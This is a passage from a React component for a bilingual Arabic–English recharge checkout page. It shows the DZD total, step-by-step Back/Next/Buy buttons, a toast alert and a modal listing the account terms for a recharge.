                  <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                  <path
                    d="M6 3L12 8V21M18 3L12 8M3 8H21"
                    stroke="white"
                    strokeWidth="0.5"
                  />
                </svg>
              </div>
              <div className="text-sm font-bold whitespace-nowrap">
                <span className="text-gray-500">{t('total_label')}</span>
                <span className={`text-[#CD1212] font-black text-xl ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
                  DZD {Number(selectedInfo.price).toLocaleString()}
                </span>
              </div>
            </div>

            {/* Buy Button */}
            <div className="flex items-center gap-2">
              {currentStep > 1 && (
                <button
                  onClick={() => {
                    setCurrentStep(prev => prev - 1);
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                  className="flex items-center justify-center rounded-xl bg-gray-100 px-4 py-2.5 text-lg font-black text-gray-700 shadow-sm transition-all hover:bg-gray-200"
                >
                  {language === 'ar' ? 'السابق' : 'Back'}
                </button>
              )}
              {currentStep === 1 && (
                <button
                  onClick={handleNextStep1}
                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
                >
                  {language === 'ar' ? 'التالي' : 'Next'}
                </button>
              )}
              {currentStep === 2 && (
                <button
                  onClick={handleNextStep2}
                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
                >
                  {language === 'ar' ? 'التالي' : 'Next'}
                </button>
              )}
              {currentStep === 3 && (
                <button
                  onClick={handleNextStep3}
                  disabled={showProcess}
                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700 disabled:bg-gray-400 disabled:opacity-60 disabled:shadow-none"
                >
                  <div className="flex h-5 w-5 items-center justify-center rounded-md border-2 border-white/50">
                    <ShieldCheck className="h-3 w-3" />
                  </div>
                  {showProcess ? 'جاري...' : t('buy_now')}
                </button>
              )}
            </div>
          </div>
        </div>

      {/* Toast Notification */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: -50, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -20, scale: 0.9 }}
            className="fixed top-20 left-4 right-4 z-[100] mx-auto max-w-xs"
          >
            <div className="flex items-center gap-3 rounded-xl bg-white p-3 shadow-xl border-l-[4px] border-red-500 border ring-1 ring-black/5">
              <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full bg-red-50 text-red-500">
                <AlertTriangle className="h-4 w-4" />
              </div>
              <p className="text-xs font-bold text-gray-800 leading-tight">
                {toastMessage}
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <Modal 
        isOpen={termsModal} 
        onClose={acceptTerms}
        title={language === 'ar' ? 'شروط قبول الشحن' : 'Recharge Acceptance Terms'}
      >
        <div className={`p-2 space-y-3 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
          <div className="flex items-start gap-3">
            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
            <p className="text-sm font-semibold text-gray-700">
              {language === 'ar' 
                ? 'يجب أن يكون الحساب غير مبند (محظور).' 
                : 'Account must not be banned.'}
            </p>
          </div>
          <div className="flex items-start gap-3">
            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
            <p className="text-sm font-semibold text-gray-700">
              {language === 'ar' 
                ? 'يجب التسجيل بالمنصة الرئيسية وليست الثانوية.' 
                : 'You must register with the main platform, not a secondary one.'}
            </p>
          </div>
          <div className="flex items-start gap-3">
            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
            <p className="text-sm font-semibold text-gray-700">
              {language === 'ar' 
                ? 'يجب أن يكون الربط الأساسي بالإيميل وليس أي منصة أخرى.' 
                : 'Primary binding must be via email, not any other platform.'}
            </p>
          </div>
          
          <button 
            onClick={acceptTerms}
            className="w-full mt-6 rounded-xl bg-red-600 text-white py-3 font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all text-sm"
          >
            {language === 'ar' ? 'موافق' : 'Accept'}
          </button>
        </div>
      </Modal>

    </div>
  );
}
